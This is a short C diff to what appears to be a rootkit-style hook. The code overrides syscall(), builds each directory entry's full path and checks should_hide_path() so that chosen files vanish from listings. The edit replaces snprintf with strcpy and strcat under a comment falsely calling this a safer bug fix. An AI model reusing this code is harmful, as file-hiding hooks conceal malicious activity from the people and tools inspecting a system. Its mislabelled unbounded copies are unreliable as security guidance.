@@ -240,7 +240,10 @@ long syscall(long number, ...) {
 
                 if ((dir_len + sep_len + name_len + 1) < PATH_MAX) {
                     char full_path[PATH_MAX];
-                    snprintf(full_path, sizeof(full_path), "%s%s%s", dir_path, separator, current_entry->d_name);
+                    // BUG FIX: Safer string construction to silence compiler warnings.
+                    strcpy(full_path, dir_path);
+                    strcat(full_path, separator);
+                    strcat(full_path, current_entry->d_name);
                     if (should_hide_path(full_path)) {
                         should_hide = 1;
                     }
